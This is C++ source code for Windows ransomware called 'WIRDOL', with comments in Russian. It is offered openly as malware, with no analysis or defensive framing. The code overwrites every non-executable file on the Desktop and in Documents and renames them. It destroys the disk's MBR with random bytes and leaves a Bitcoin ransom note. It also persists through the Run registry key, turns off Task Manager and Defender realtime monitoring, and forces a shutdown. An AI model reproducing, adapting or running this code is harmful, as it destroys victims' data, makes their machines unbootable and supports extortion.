#include <windows.h>
#include <iostream>
#include <string>
#include <vector>
#include <fstream>
#include <thread>
#include <chrono>
#include <random>
#include <shlobj.h>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")

// ==========================================
// КОНСТАНТЫ И НАСТРОЙКИ
// ==========================================
const std::wstring RANSOM_NOTE = L"YOUR_FILES_HAVE_BEEN_ENCRYPTED.txt";
const std::wstring ENCRYPTED_EXT = L".WIRDOL_LOCKED";
const std::string RANSOM_TEXT = "ALL YOUR FILES HAVE BEEN ENCRYPTED BY WIRDOL GROUP.\n"
                                "TO DECRYPT THEM, SEND 1 BTC TO: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n"
                                "CONTACT: wirdol@onion.com\n"
                                "DO NOT TRY TO RECOVER THEM YOURSELF. YOU WILL LOSE EVERYTHING.";

// ==========================================
// УТИЛИТЫ ДЛЯ РАБОТЫ С ФАЙЛАМИ
// ==========================================
std::wstring GetDesktopPath() {
    wchar_t path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, path))) {
        return std::wstring(path);
    }
    return L"C:\\Users\\Public\\Desktop";
}

std::wstring GetDocumentsPath() {
    wchar_t path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_PERSONAL, NULL, 0, path))) {
        return std::wstring(path);
    }
    return L"C:\\Users\\Public\\Documents";
}

// ==========================================
// ШИФРОВАНИЕ ФАЙЛОВ (ИМИТАЦИЯ)
// ==========================================
void EncryptFile(const std::wstring& filePath) {
    // Открываем файл для чтения
    std::ifstream inFile(filePath, std::ios::binary);
    if (!inFile) return;

    // Читаем содержимое
    std::string content((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
    inFile.close();

    // "Шифруем" (перезаписываем мусором)
    std::ofstream outFile(filePath, std::ios::binary | std::ios::trunc);
    if (outFile) {
        outFile << "ENCRYPTED_BY_WIRDOL_RANSOMWARE_2026";
        outFile.close();
    }

    // Меняем расширение
    std::wstring newPath = filePath + ENCRYPTED_EXT;
    MoveFileW(filePath.c_str(), newPath.c_str());
}

void EncryptDirectory(const std::wstring& dirPath) {
    std::wstring searchPath = dirPath + L"\\*";
    WIN32_FIND_DATAW findData;
    HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);

    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (wcscmp(findData.cFileName, L".") == 0 || wcscmp(findData.cFileName, L"..") == 0) continue;

        std::wstring fullPath = dirPath + L"\\" + findData.cFileName;

        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            // Рекурсивно обходим папки
            EncryptDirectory(fullPath);
        } else {
            // Шифруем файл (пропускаем системные и наши записки)
            if (fullPath.find(L".exe") == std::wstring::npos && 
                fullPath.find(L".dll") == std::wstring::npos && 
                fullPath.find(RANSOM_NOTE) == std::wstring::npos) {
                EncryptFile(fullPath);
            }
        }
    } while (FindNextFileW(hFind, &findData));

    FindClose(hFind);
}

// ==========================================
// УНИЧТОЖЕНИЕ MBR
// ==========================================
void DestroyMBR() {
    HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE,
                                 FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDevice != INVALID_HANDLE_VALUE) {
        BYTE garbage[1024]; // 1 КБ мусора (MBR + запас)
        std::mt19937 rng(std::random_device{}());
        std::uniform_int_distribution<int> dist(0, 255);

        for (int i = 0; i < 1024; i++) {
            garbage[i] = static_cast<BYTE>(dist(rng));
        }

        DWORD bytesWritten;
        WriteFile(hDevice, garbage, 1024, &bytesWritten, NULL);
        CloseHandle(hDevice);
    }
}

// ==========================================
// ОСТАВЛЯЕМ ЗАПИСКУ
// ==========================================
void DropRansomNote() {
    std::wstring desktop = GetDesktopPath();
    std::wstring notePath = desktop + L"\\" + RANSOM_NOTE;
    
    std::ofstream note(notePath);
    if (note) {
        note << RANSOM_TEXT;
        note.close();
    }
}

// ==========================================
// АВТОЗАГРУЗКА (PERSISTENCE)
// ==========================================
void EstablishPersistence() {
    wchar_t currentPath[MAX_PATH];
    GetModuleFileNameW(NULL, currentPath, MAX_PATH);

    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"WirdolRansom", 0, REG_SZ, (const BYTE*)currentPath, (wcslen(currentPath) + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
    }
}

// ==========================================
// ОТКЛЮЧЕНИЕ ЗАЩИТЫ
// ==========================================
void DisableDefenses() {
    system("taskkill /f /im taskmgr.exe > nul 2>&1");
    system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f > nul 2>&1");
    system("powershell -WindowStyle Hidden -Command Set-MpPreference -DisableRealtimeMonitoring $true > nul 2>&1");
}

// ==========================================
// ГЛАВНАЯ ФУНКЦИЯ
// ==========================================
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // 1. Отключаем защиту
    DisableDefenses();

    // 2. Устанавливаем автозагрузку
    EstablishPersistence();

    // 3. Оставляем записку на рабочем столе
    DropRansomNote();

    // 4. Шифруем файлы на рабочем столе и в документах
    std::wstring desktop = GetDesktopPath();
    std::wstring documents = GetDocumentsPath();

    std::thread t1(EncryptDirectory, desktop);
    std::thread t2(EncryptDirectory, documents);

    t1.join();
    t2.join();

    // 5. Уничтожаем MBR (в фоне)
    std::thread mbrThread(DestroyMBR);
    mbrThread.detach();

    // 6. Вырубаем систему
    Sleep(2000);
    system("shutdown /s /f /t 0");

    return 0;
}
